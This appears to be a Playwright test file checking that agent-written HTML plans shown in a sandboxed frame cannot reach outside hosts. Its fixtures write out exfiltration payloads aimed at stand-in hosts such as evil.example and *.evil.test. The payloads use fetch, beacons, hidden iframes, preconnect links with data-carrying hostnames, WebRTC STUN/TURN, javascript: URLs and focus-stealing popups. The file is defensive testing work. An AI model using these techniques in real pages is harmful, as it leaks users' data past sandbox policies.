// A plan or artifact an agent wrote can't load anything from another host (HA-266): its frame's policy (FRAME_CSP in
// src/components/task/htmlFrame.ts) and the board's frame-src (index.html) let it load only its own inline scripts and
// styles, data: URLs and libraries from the CDNs, and WebRTC is taken away from it (noWebRtc, HA-269), and from a
// javascript: URL frame in it (Trusted Types). What's counted is connections and UDP packets, not just requests, with
// hostnames that carry the data mapped to a local server (--host-resolver-rules). Chrome still connects for a frame
// load the policy refuses, and for a <link rel=preconnect>, unless its "Preload pages" setting is off (HA-269): the
// checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs say. A srcdoc frame
// the page makes itself can still use WebRTC in a browser (not in the desktop app, see electron/preload.cjs): that
// isn't checked here.
import assert from "node:assert/strict";
import dgram from "node:dgram";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import http from "node:http";
import { createRequire } from "node:module";
import net from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, test } from "vite-plus/test";
import { launchOptions } from "../../../../scripts/ui-check.mjs";
import { demoProject, startServer, withBrowser } from "./harness.mjs";

const { chromium } = createRequire(import.meta.url)("playwright-core");

let server, project, plan, outside, hits, connections, evil, sni, udp, packets;
beforeAll(async () => {
  server = startServer();
  project = await demoProject(server);
  plan = (await server.api("GET", `/projects/${project.id}/tasks`)).find((t) => t.labels.includes("plan"));
  // Another host, as far as the board is concerned (another port): it counts what reaches it, whether or not the
  // browser's request interception sees it.
  hits = [];
  outside = http.createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" }).end("ok");
  });
  connections = 0;
  outside.on("connection", () => connections++);
  await new Promise((done) => outside.listen(0, "127.0.0.1", done));
  // Where *.evil.test goes: it keeps the server name each connection's TLS ClientHello carries (SNI), or "" without one.
  sni = [];
  evil = net.createServer((socket) => {
    const at = sni.push("") - 1;
    socket.on("error", () => {});
    socket.once("data", (d) => {
      sni[at] = d.toString("latin1").match(/[\w.-]+\.evil\.test/)?.[0] ?? "";
      socket.destroy();
    });
  });
  await new Promise((done) => evil.listen(0, "127.0.0.1", done));
  // A STUN server's port.
  packets = 0;
  udp = dgram.createSocket("udp4").on("message", () => packets++);
  await new Promise((done) => udp.bind(0, "127.0.0.1", done));
});
const userDirs = [];
afterAll(() => {
  outside?.close();
  evil?.close();
  udp?.close();
  server?.stop();
  for (const dir of userDirs) rmSync(dir, { recursive: true, force: true });
});

/**
 * A browser of its own for `withBrowser` (its `browser`, closed with the check), which sends *.evil.test to `evil`, with
 * Chrome's "Preload pages" setting (Settings, Performance) on, as it is by default, or off.
 */
async function evilBrowser({ preload }) {
  const dir = mkdtempSync(join(tmpdir(), "ia-csp-"));
  userDirs.push(dir);
  mkdirSync(join(dir, "Default"));
  if (!preload) writeFileSync(join(dir, "Default", "Preferences"), JSON.stringify({ net: { network_prediction_options: 2 } }));
  const context = await chromium.launchPersistentContext(dir, {
    ...launchOptions(),
    args: ["--host-resolver-rules=MAP *.evil.test 127.0.0.1"],
    viewport: { width: 1900, height: 1000 },
  });
  return { newContext: async () => context };
}

/** A script that tries WebRTC: STUN to port `stun` and TURN over TCP to a host named after the data on port `turn`. */
const webRtc = (stun, turn) => `
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stun}" }, { urls: "turn:secret-turn.evil.test:${turn}?transport=tcp", username: "secret", credential: "x" }] });
    pc.createDataChannel("d");
    pc.createOffer().then((o) => pc.setLocalDescription(o));
    window.pc = pc;
  } catch {}`;

/** A javascript: URL that tries WebRTC as `webRtc` does, in the new document of the frame it's loaded in. */
const jsWebRtc = (stun, turn) => `javascript:${encodeURIComponent(`(() => {${webRtc(stun, turn)}})()`)}`;

/** A script that adds a <link rel=preconnect> to `host`.evil.test, on port `port`. */
const preconnect = (host, port) => `
  const pc = document.createElement("link");
  pc.rel = "preconnect";
  pc.href = "https://${host}.evil.test:${port}/";
  document.head.append(pc);`;

/**
 * What a page tries, to send `secret` out: everything here goes to `out` (the counting server), evil.example, a host
 * named after the data (`evil`'s port, as *.evil.test) or the STUN server (`stun`'s port).
 */
const leaks = (out, evil, stun) => `
<p id="secret">secret</p>
<img src="${out}/img?d=secret"><img src="https://evil.example/img?d=secret">
<link rel="stylesheet" href="${out}/css">
<link rel="preconnect" href="https://secret-pc.evil.test:${evil}/">
<div style="background: url(${out}/bg)">bg</div>
<iframe src="${out}/frame"></iframe>
<form id="post" action="${out}/form" method="post"><input name="d" value="secret"></form>
<script>
  window.blocked = [];
  document.addEventListener("securitypolicyviolation", (e) => blocked.push(e.violatedDirective + " " + e.blockedURI));
  fetch("${out}/fetch?d=secret").catch(() => {});
  fetch("https://evil.example/fetch?d=secret").catch(() => {});
  navigator.sendBeacon?.("${out}/beacon", "secret");
  try { new WebSocket("${out.replace("http", "ws")}/ws"); } catch {}
  new Image().src = "${out}/late-img?d=secret";
  // Hidden frames sent to hosts named after the data, which the policy refuses.
  for (let i = 0; i < 3; i++) {
    const f = document.createElement("iframe");
    f.hidden = true;
    document.body.append(f);
    f.contentWindow.location.href = "https://secret" + i + ".evil.test:${evil}/";
  }
  ${preconnect("secret-pcjs", evil)}
  // A new document (a javascript: URL's, which frame-src doesn't hold) would have WebRTC again.
  const js = document.createElement("iframe");
  js.hidden = true;
  js.src = "${jsWebRtc(stun, evil)}";
  document.body.append(js);
  window.rtc = typeof RTCPeerConnection;
  ${webRtc(stun, evil)}
  addEventListener("load", () => {
    // A library from a CDN still loads (answered by the check's route).
    const s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/fake-lib@1/lib.js";
    document.head.append(s);
  });
</script>
<iframe src="https://secret-src.evil.test:${evil}/"></iframe>
<iframe hidden src="${jsWebRtc(stun, evil)}"></iframe>
<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><link rel="preconnect" href="https://secret-nested-pc.evil.test:${evil}/"><iframe hidden src="${jsWebRtc(stun, evil)}"></iframe><script>
  fetch("${out}/nested-fetch").catch(() => {});
  ${preconnect("secret-nested-pcjs", evil)}
  window.rtc = typeof RTCPeerConnection;
  ${webRtc(stun, evil)}
  parent.postMessage({ nested: "ran" }, "*");
</script></template></ia-html>`;

async function openDocument(ui, content) {
  const at = new Date().toISOString();
  await ui.page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
    route.fulfill({
      json: {
        task_type: "plan",
        file: "plan.html",
        versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
        version: 1,
        content,
      },
    }),
  );
  await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
  // The panel can show the document more than once as it loads: wait for one that stays.
  const deadline = Date.now() + 10000;
  for (;;) {
    const frame = ui.page.frames().find((f) => f.parentFrame() === ui.page.mainFrame() && f.url() === "about:srcdoc");
    const marked = await frame?.evaluate(() => document.readyState === "complete" && (window.iaCheckMark = true)).catch(() => false);
    await ui.page.waitForTimeout(500);
    if (marked && (await frame.evaluate(() => window.iaCheckMark === true).catch(() => false))) return frame;
    if (Date.now() > deadline) throw new Error("the document's frame didn't settle");
  }
}

// A plan in the theme, and a whole page of its own (shown as an artifact is).
for (const [name, wrap] of [
  ["a plan", (body) => `<h1>Leaky plan</h1>${body}`],
  ["a whole page", (body) => `<!doctype html><html lang="en"><head><title>Leaky</title></head><body><h1>Leaky page</h1>${body}</body></html>`],
]) {
  test(`${name} an agent wrote reaches no other host: no images, fetch, frames, forms, navigation or WebRTC; CDN libraries still load`, async () => {
    hits.length = 0;
    sni.length = 0;
    connections = packets = 0;
    const out = `http://127.0.0.1:${outside.address().port}`;
    // The policy's refusals are console errors.
    const browser = await evilBrowser({ preload: false });
    const allowErrors = [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED|requires 'TrustedScript'/];
    await withBrowser(server, { browser, allowErrors }, async (ui) => {
      const { page } = ui;
      const external = [];
      await page.route(/^https?:\/\//, (route) => {
        const url = route.request().url();
        if (url.startsWith(server.url)) return route.continue();
        external.push(url);
        if (url.startsWith("https://cdn.jsdelivr.net/")) return route.fulfill({ contentType: "text/javascript", body: "window.fakeLib = 'loaded'" });
        return route.fulfill({ body: "ok" });
      });
      const frame = await openDocument(ui, wrap(leaks(out, evil.address().port, udp.address().port)));
      await frame.waitForFunction(() => window.fakeLib === "loaded", null, { timeout: 10000 });
      assert.equal(await frame.evaluate(() => document.compatMode), "CSS1Compat", "the page stays in standards mode");
      if (name === "a plan") {
        // The <ia-html>'s frame is there (a srcdoc frame, which the policy's frame-src doesn't hold).
        const nested = frame.childFrames().find((f) => f.url() === "about:srcdoc");
        assert.ok(nested, "the <ia-html> frame");
        await nested.waitForFunction(() => document.querySelector("p")?.textContent === "nested", null, { timeout: 5000 });
        assert.equal(await nested.evaluate(() => window.rtc), "undefined", "the <ia-html>'s frame has no WebRTC");
      }
      assert.equal(await frame.evaluate(() => window.rtc), "undefined", "the frame has no WebRTC");
      const blocked = await frame.evaluate(() => window.blocked);
      assert.ok(blocked.some((b) => b.startsWith("img-src")) && blocked.some((b) => b.startsWith("connect-src")), JSON.stringify(blocked));
      // Posting a form, or the frame navigating itself, to another host goes nowhere (the policy's form-action and the
      // board's frame-src: the frame is left on an error page).
      await frame.evaluate(() => document.getElementById("post").requestSubmit());
      await page.waitForTimeout(500);
      await page
        .frames()[1]
        .evaluate((port) => (location.href = `https://secret-nav.evil.test:${port}/nav?d=secret`), evil.address().port)
        .catch(() => {});
      await page.waitForTimeout(1500);
      assert.deepEqual(hits, [], `requests reached the other host (blocked: ${JSON.stringify(blocked)})`);
      assert.equal(connections, 0, "connections reached the other host");
      assert.deepEqual(sni, [], "connections reached hosts named after the data");
      assert.equal(packets, 0, "WebRTC reached the STUN server");
      assert.deepEqual(
        external.filter((u) => !u.startsWith("https://cdn.jsdelivr.net/")),
        [],
        "requests left the board",
      );
      // The board's own page has WebRTC, and it's counted: STUN packets, and TURN's connections to a host named after the data.
      await page.evaluate(webRtc(udp.address().port, evil.address().port));
      const deadline = Date.now() + 5000;
      while (!(packets && sni.length) && Date.now() < deadline) await page.waitForTimeout(100);
      assert.ok(packets && sni.length, `the board's own WebRTC went uncounted: ${packets} packets, ${sni.length} connections`);
    });
  });
}

// What the docs say (docs/guide/board.md): with "Preload pages" on, Chrome looks up and connects to the host of a frame
// load the policy refuses, and of a <link rel=preconnect> (in the page's HTML or added by its script), sending the data
// in the hostname (TLS SNI too). Should this fail because Chrome no longer does, say so where the docs and FRAME_CSP's
// comment name it.
test("in Chrome with Preload pages on, a refused frame load and a preconnect link still connect to the host they name", async () => {
  sni.length = 0;
  const port = evil.address().port;
  const browser = await evilBrowser({ preload: true });
  await withBrowser(server, { browser, allowErrors: [/Content Security Policy|violates|Refused to/] }, async (ui) => {
    await openDocument(
      ui,
      `<h1>Leaky</h1><iframe hidden src="https://secret.evil.test:${port}/"></iframe><link rel="preconnect" href="https://secret-pc.evil.test:${port}/"><script>${preconnect("secret-pcjs", port)}</script>`,
    );
    const hosts = ["secret.evil.test", "secret-pc.evil.test", "secret-pcjs.evil.test"];
    const deadline = Date.now() + 5000;
    while (!hosts.every((h) => sni.includes(h)) && Date.now() < deadline) await ui.page.waitForTimeout(100);
    assert.deepEqual(
      hosts.filter((h) => !sni.includes(h)),
      [],
      `no connection carried these hostnames: ${JSON.stringify(sni)}`,
    );
  });
});

test("a link in a plan, or in its <ia-html>, opens in a new tab after the user's click in it, rather than in the frame", async () => {
  await withBrowser(server, {}, async (ui) => {
    const { page } = ui;
    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
    const frame = await openDocument(
      ui,
      `<h1>Links</h1><p><a id="link" href="https://example.com/plan">a link</a> <button id="open" onclick="window.open('https://example.com/button')">open</button></p><ia-html><template><a id="inner" href="https://example.com/inner" target="_top">inner</a></template></ia-html>`,
    );
    for (const [where, id, url] of [
      [frame, "#link", "https://example.com/plan"],
      [frame, "#open", "https://example.com/button"],
      [page.frameLocator("iframe").frameLocator("ia-html iframe"), "#inner", "https://example.com/inner"],
    ]) {
      const opened = page.context().waitForEvent("page", { timeout: 5000 });
      await where.locator(id).click();
      const tab = await opened;
      await tab.waitForURL(url);
      await tab.close();
    }
    assert.equal(frame.url(), "about:srcdoc");
    assert.equal(await page.getByText("opens a link").count(), 0);
  });
});

// The desktop app (Electron) has no popup blocker: a popup the frame opened as it loaded went straight to the browser,
// with whatever the page put in its URL.
test("a plan can't open a link without the user's click in it: the board asks instead, also after the frame takes the focus", async () => {
  await withBrowser(server, { allowErrors: [/allow-popups/] }, async (ui) => {
    const { page } = ui;
    const opened = [];
    page.context().on("page", (p) => opened.push(p.url()));
    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
    const content = `<h1>Leaky</h1><a id="blank" href="https://example.com/blank?d=secret" target="_blank">blank</a><input id="steal">
<script>
  // The browser's window.open (the board's comes after the page's scripts), and a fresh frame's, as it loads.
  window.open("https://example.com/load?d=secret");
  const f = document.createElement("iframe");
  document.body.append(f);
  try { f.contentWindow.open.call(window, "https://example.com/native?d=secret"); } catch {}
  // A click of its own on a link, and one the board's handler doesn't see.
  document.getElementById("blank").addEventListener("click", (e) => e.stopPropagation());
  document.getElementById("blank").click();
  // Then it keeps taking the focus and asking the board.
  setInterval(() => { window.focus(); document.getElementById("steal").focus(); window.open("https://example.com/later?d=secret"); }, 200);
</script>`;
    const at = new Date().toISOString();
    await page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
      route.fulfill({
        json: {
          task_type: "plan",
          file: "plan.html",
          versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
          version: 1,
          content,
        },
      }),
    );
    await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
    // Playwright's queries count as the user's activation (they run as a gesture): let that run out, untouched.
    await page.waitForTimeout(6500);
    assert.deepEqual(
      opened.filter((u) => !u.includes("/later")),
      [],
      "the frame opened nothing itself",
    );
    opened.length = 0;
    await page.waitForTimeout(1000);
    assert.deepEqual(opened, [], "the board opened nothing without the user's input");
    assert.equal(await page.getByText("opens a link").count(), 0, "nor asked");
    // The user types in the composer: the frame takes the focus, while the board has the user's activation.
    await page.getByPlaceholder("Ask for changes to the plan…").click();
    await page.keyboard.type("hello");
    await page.waitForTimeout(1000);
    assert.deepEqual(opened, [], "nothing opened after the user's input in the board");
    assert.equal(await page.evaluate(() => document.activeElement?.tagName), "IFRAME", "the frame took the focus");
    // The board asks, showing the link, and opens it only from its own button.
    await page.getByText("opens a link").waitFor();
    assert.equal(await page.locator("[role=alert] code").innerText(), "https://example.com/later?d=secret");
    assert.deepEqual(opened, []);
  });
});
